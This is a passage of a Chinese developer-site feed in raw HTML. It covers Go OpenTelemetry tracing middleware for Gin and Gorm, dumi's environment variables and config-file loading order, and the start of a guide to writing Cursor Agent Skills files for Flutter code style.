		Endpoint: <span class="hljs-string">"http://192.168.163.132:14268/api/traces"</span>,
		Sampler:  <span class="hljs-number">1</span>,
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})
	r := gin.Default()
    <span class="hljs-comment">// 先介绍一下 这个源码 然后介绍一下  gorm 对这个 opentelemetry 的 支持的中间件</span>
	r.Use(otelgin.Middleware(<span class="hljs-string">"gin_Middleware"</span>))
	r.GET(<span class="hljs-string">"/"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {

	})
	r.GET(<span class="hljs-string">"/server"</span>, Server)
	r.Run(<span class="hljs-string">":8090"</span>)
}

</code></pre>
<h2 data-id="heading-14">执行结果</h2>
<p>第二张是最后一个 <code>gin</code> 中间件生成的
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bac35b2318ae4ba6aa7e76b68968070a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=2Ojdqgf5aObIlg3e3kOfpWngzng%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf51bb4d2fce42039083028853df3158~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=JaSQsRS3y0H5E5Ml0bJzPJB%2Bgo0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-15">核心逻辑讲解</h2>
<h3 data-id="heading-16"><code>otelgin.Middleware("gin_Middleware")</code> 函数</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Middleware</span><span class="hljs-params">(service <span class="hljs-type">string</span>, opts ...Option)</span></span> gin.HandlerFunc {
	cfg := config{}
	<span class="hljs-comment">// 依旧是可以设置一些配置</span>
	<span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
		opt.apply(&amp;cfg)
	}
    <span class="hljs-comment">// 这里就是没传就自己去拿 调用的函数也是之前讲过的</span>
	<span class="hljs-keyword">if</span> cfg.TracerProvider == <span class="hljs-literal">nil</span> {
		cfg.TracerProvider = otel.GetTracerProvider()
	}
    <span class="hljs-comment">// 这里生成 Tracer</span>
	tracer := cfg.TracerProvider.Tracer(
		ScopeName,
		oteltrace.WithInstrumentationVersion(Version()),
	)
    <span class="hljs-comment">// 这里 拿  Propagators</span>
	<span class="hljs-keyword">if</span> cfg.Propagators == <span class="hljs-literal">nil</span> {
		cfg.Propagators = otel.GetTextMapPropagator()
	}
    <span class="hljs-comment">// 监控系统相关</span>
	<span class="hljs-keyword">if</span> cfg.MeterProvider == <span class="hljs-literal">nil</span> {
		cfg.MeterProvider = otel.GetMeterProvider()
	}
	<span class="hljs-keyword">if</span> cfg.SpanNameFormatter == <span class="hljs-literal">nil</span> {
		cfg.SpanNameFormatter = defaultSpanNameFormatter
	}
	meter := cfg.MeterProvider.Meter(
		ScopeName,
		metric.WithInstrumentationVersion(Version()),
	)

	sc := semconv.NewHTTPServer(meter)

	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> {
		requestStartTime := time.Now()
        <span class="hljs-comment">// 这里就是 中间件需要记录的东西</span>
        <span class="hljs-comment">// 执行前 记录一下  执行后记录一下 已经拿到 span 关键的链路已经解决剩下就是业务问题·</span>
        
}

</code></pre>
<h3 data-id="heading-17"><code>tracing.NewPlugin()</code> 函数</h3>
<p><code>Gorm</code> 在设计之初就预留了很多接口，以便未来会用到，这也体现了go语言面向接口编程</p>
<p>这里两个重要函数 <code>before</code> 和 <code>after</code> 返回的是钩子函数，绑定到 <code>Gorm</code> , <code>Gorm</code> 会在 SQL 执行时自动触发这些钩子</p>
<p>因为链路传递需要 <code>context</code> ，通过<code>db.WithContext(spanCtx)</code> 将上层业务的追踪上下文注入 <code>Gorm</code> ，供后续钩子使用。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPlugin</span><span class="hljs-params">(opts ...Option)</span></span> gorm.Plugin {
   
	p := &amp;otelPlugin{}
	<span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
		opt(p)
	}
	
	<span class="hljs-keyword">if</span> p.provider == <span class="hljs-literal">nil</span> {
		p.provider = otel.GetTracerProvider()
	}
	p.tracer = p.provider.Tracer(<span class="hljs-string">"gorm.io/plugin/opentelemetry"</span>)

	<span class="hljs-keyword">return</span> p
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *otelPlugin)</span></span> before(spanName <span class="hljs-type">string</span>) gormHookFunc {...}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *otelPlugin)</span></span> after() gormHookFunc {...}
</code></pre>
<h2 data-id="heading-18">总结</h2>
<p>本篇从本地单进程链路验证，到跨服务追踪上下文的<code>Inject/Extract</code>传递，再到 <code>Gin</code>、<code>Gorm</code> 主流生态的自动埋点集成，完整落地了 <code>OpenTelemetry</code> 分布式追踪的实战全流程；既承接了上篇的初始化底层逻辑，又掌握了微服务场景下链路保活与框架适配的核心方法，相关方案可直接迁移至生产环境，实现从接口调用到数据库操作的全链路可观测闭环。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[dumi 环境变量]]></title>    <link>https://juejin.cn/post/7603142147642703915</link>    <guid>https://juejin.cn/post/7603142147642703915</guid>    <pubDate>2026-02-05T09:28:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147642703915" data-draft-id="7603010441149546537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="dumi 环境变量"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T09:28:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="UndefinedLuo"/> <meta itemprop="url" content="https://juejin.cn/user/2893570336367725"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            dumi 环境变量
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2893570336367725/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    UndefinedLuo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:28:38.000Z" title="Thu Feb 05 2026 09:28:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、env（process.env.NODE_ENV）</h2>
<p><code>process.env.NODE_ENV</code> 由 dumi 自动注入，用于区分开发态和生产态：</p>

























<table><thead><tr><th>命令</th><th>环境</th><th>process.env.NODE_ENV的值</th></tr></thead><tbody><tr><td><code>dumi dev</code></td><td>dev</td><td><code>development</code></td></tr><tr><td><code>dumi test</code></td><td>test</td><td><code>production</code></td></tr><tr><td><code>dumi build</code></td><td>prod</td><td><code>production</code></td></tr></tbody></table>
<p>示例：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">if</span> (process.env.NODE_ENV === <span class="hljs-string">'production'</span>) {
  <span class="hljs-comment">// test 和 prod 都会进入这里</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-1">二、dumi 内置环境：dev / test / prod</h2>





























<table><thead><tr><th>命令</th><th>环境</th><th>对应配置文件</th><th>说明</th></tr></thead><tbody><tr><td><code>dumi dev</code></td><td>dev</td><td><code>.dumirc.ts</code> <code>.dumirc.dev.ts</code> <code>.dumirc.local.ts</code></td><td>开发环境，基础 + 阶段性 + 本地覆盖</td></tr><tr><td><code>dumi test</code></td><td>test</td><td><code>.dumirc.ts</code> <code>.dumirc.test.ts</code> <code>.dumirc.local.ts</code></td><td>测试/预发布环境，基础 + 阶段性 + 本地覆盖</td></tr><tr><td><code>dumi build</code></td><td>prod</td><td><code>.dumirc.ts</code> <code>.dumirc.prod.ts</code> <code>.dumirc.local.ts</code></td><td>正式生产环境，基础 + 阶段性 + 本地覆盖</td></tr></tbody></table>
<h2 data-id="heading-2">三、DUMI_ENV</h2>
<p><code>DUMI_ENV</code> 用于<strong>少数特殊场景的额外配置维度</strong>，当 <code>dev / test / prod</code> 不够区分时使用，例如：</p>
<ul>
<li>同一环境需要区分内部 / 对外文档</li>
<li>同一环境存在多套部署或发布目标</li>
<li>为特定用途准备独立配置（演示版、临时发布等）</li>
</ul>
<p><strong>注意</strong>：<code>DUMI_ENV</code> 不能设置为 <code>dev</code> / <code>test</code> / <code>prod</code>。</p>
<h2 data-id="heading-3">四、配置文件加载规则</h2>
<h3 data-id="heading-4">1. 指定 DUMI_ENV</h3>
<p>按以下顺序加载，越靠后优先级越高：</p>
<ol>
<li><code>.dumirc.ts</code></li>
<li><code>.dumirc.${DUMI_ENV}.ts</code></li>
<li><code>.dumirc.${dev | test | prod}.ts</code></li>
<li><code>.dumirc.${dev | test | prod}.${DUMI_ENV}.ts</code></li>
<li><code>.dumirc.local.ts</code></li>
</ol>
<p>后加载的配置会覆盖先加载的配置。</p>
<h3 data-id="heading-5">2. 未指定 DUMI_ENV</h3>
<p>加载：</p>
<ol>
<li><code>.dumirc.ts</code></li>
<li>当前环境对应配置文件（<code>.dumirc.dev.ts</code> / <code>.dumirc.test.ts</code> / <code>.dumirc.prod.ts</code>）</li>
<li><code>.dumirc.local.ts</code></li>
</ol>
<h2 data-id="heading-6">五、总结</h2>
<ul>
<li><code>NODE_ENV</code>：区分 <strong>开发态 / 生产态</strong></li>
<li>内置环境 <code>dev / test / prod</code>：区分 <strong>构建阶段</strong></li>
<li><code>DUMI_ENV</code>：区分 <strong>特殊业务 / 场景配置</strong></li>
</ul>
<blockquote>
<p>当你发现同一构建阶段但配置不同，就考虑使用 <code>DUMI_ENV</code>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[FLutter的Cursor Skills 实战分享]]></title>    <link>https://juejin.cn/post/7602996277665316918</link>    <guid>https://juejin.cn/post/7602996277665316918</guid>    <pubDate>2026-02-05T09:28:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602996277665316918" data-draft-id="7603030564837654582" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FLutter的Cursor Skills 实战分享"/> <meta itemprop="keywords" content="Flutter,前端"/> <meta itemprop="datePublished" content="2026-02-05T09:28:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明君87997"/> <meta itemprop="url" content="https://juejin.cn/user/413072103838462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FLutter的Cursor Skills 实战分享
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/413072103838462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明君87997
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:28:41.000Z" title="Thu Feb 05 2026 09:28:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">聊聊 Cursor 的 Skills 功能，用 Flutter 项目举例</h2>
<p>最近网上一直在炒 Agent Skills 功能, 年底不忙了摸索了一下 Cursor 的Agent Skills 这个功能。结果用了几天之后... 哇偶真香。</p>
<p>今天就来聊聊这玩意儿怎么用，顺便分享下我踩的坑。</p>
<hr/>
<h3 data-id="heading-1">这东西到底是干嘛的？</h3>
<p>其实说白了，就是让你"调教" AI 的一种方式。</p>
<p>你有没有遇到过这种情况：让 AI 帮你写个 Flutter Widget，它写出来的代码风格跟你项目里的完全不一样？你说"加个 const"，它下次又忘了。你说"用 GetX"，它给你整个 Provider...</p>
<p>Skills 就是解决这个问题的。你写一个配置文件，告诉 AI "我们项目是这么干的"，它就会照着来。</p>
<hr/>
<h3 data-id="heading-2">文件放哪儿？</h3>
<p>两个地方可以放：</p>
<p><strong>个人目录</strong>：<code>~/.cursor/skills/你的技能名/SKILL.md</code></p>
<ul>
<li>所有项目都能用</li>
<li>比如你的代码风格偏好、常用的工具链配置</li>
</ul>
<p><strong>项目目录</strong>：<code>项目根目录/.cursor/skills/你的技能名/SKILL.md</code></p>
<ul>
<li>只有当前项目用</li>
<li>可以提交 Git，团队共享</li>
</ul>
<p>因为公司只有我一个移动端开发, 所以我一般是通用的放个人目录，项目特定的放项目里。</p>
<hr/>
<h3 data-id="heading-3">入门：写个最简单的</h3>
<p>然后来个最简单的感受一下。</p>
<p>在 <code>~/.cursor/skills/flutter-widget/</code> 下面建个 <code>SKILL.md</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-widget</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">写</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">Widget</span> <span class="hljs-string">的时候用这个。创建组件、写页面、搞</span> <span class="hljs-string">UI</span> <span class="hljs-string">的时候会自动触发。</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">​</span>
<span class="hljs-comment"># 我的 Widget 写法</span>
<span class="hljs-string">​</span>
<span class="hljs-string">别废话，直接上规矩：</span>
<span class="hljs-string">​</span>
<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">能用</span> <span class="hljs-string">StatelessWidget</span> <span class="hljs-string">就别用</span> <span class="hljs-string">StatefulWidget</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">构造函数必须加</span> <span class="hljs-string">const</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">参数必填的用</span> <span class="hljs-string">required</span>
<span class="hljs-string">​</span>
<span class="hljs-string">就这样写：</span>
<span class="hljs-string">​</span>
<span class="hljs-string">```dart</span>
<span class="hljs-string">class</span> <span class="hljs-string">UserCard</span> <span class="hljs-string">extends</span> <span class="hljs-string">StatelessWidget</span> {
  <span class="hljs-string">const</span> <span class="hljs-string">UserCard(</span>{
    <span class="hljs-string">super.key</span>,
    <span class="hljs-string">required</span> <span class="hljs-string">this.name</span>,
  }<span class="hljs-string">);</span>
<span class="hljs-string">​</span>
  <span class="hljs-string">final</span> <span class="hljs-string">String</span> <span class="hljs-string">name;</span>
<span class="hljs-string">​</span>
  <span class="hljs-string">@override</span>
  <span class="hljs-string">Widget</span> <span class="hljs-string">build(BuildContext</span> <span class="hljs-string">context)</span> {
    <span class="hljs-string">return</span> <span class="hljs-string">Text(name);</span>
  }
}
</code></pre>
<p>别给我整什么 <code>Key? key</code> 老写法，直接 <code>super.key</code> 完事。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">​</span>
<span class="hljs-string">保存。这就完事了???</span>
<span class="hljs-string">​</span>
<span class="hljs-string">现在你让</span> <span class="hljs-string">AI</span> <span class="hljs-string">"帮我写个用户卡片组件"</span><span class="hljs-string">，它就会按这个风格来。</span>
<span class="hljs-string">​</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## 进阶：description 很重要！</span>
<span class="hljs-string">​</span>
<span class="hljs-string">这里有个坑我踩过——description</span> <span class="hljs-string">写得太随意，AI</span> <span class="hljs-string">根本不触发你的技能。</span>
<span class="hljs-string">​</span>
<span class="hljs-string">**错误示范**：</span>
<span class="hljs-string">```yaml</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">开发</span>
</code></pre>
<p>这太模糊了，AI 不知道什么时候该用。</p>
<p><strong>正确示范</strong>：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">description:</span> 写 Flutter Widget 的时候用。当用户说<span class="hljs-string">"创建组件"</span>、<span class="hljs-string">"写页面"</span>、<span class="hljs-string">"搞个 UI"</span>、<span class="hljs-string">"弄个卡片"</span>的时候触发。
</code></pre>
<p>关键是要写清楚<strong>什么时候用</strong>。AI 是根据这个 description 来判断要不要加载你的技能的。</p>
<hr/>
<h3 data-id="heading-4">中级玩法：加点料</h3>
<p>用了一阵之后，我发现光写 Widget 规范不够。导入顺序、文件命名这些也得管，不然代码还是乱。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-dev</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">开发全套规范。写代码、建文件、搞页面的时候用。</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">​</span>
<span class="hljs-comment"># Flutter 开发规范（我的版本）</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## 文件怎么命名</span>
<span class="hljs-string">​</span>
<span class="hljs-string">我习惯这样：</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">Widget</span> <span class="hljs-string">文件：`user_card.dart`（小写下划线）</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">页面文件：`user_page.dart`</span> <span class="hljs-string">或</span> <span class="hljs-string">`user_view.dart`</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">服务类：`user_service.dart`</span>
<span class="hljs-string">​</span>
<span class="hljs-string">类名当然还是大驼峰</span> <span class="hljs-string">`UserCard`。</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## import 顺序</span>
<span class="hljs-string">​</span>
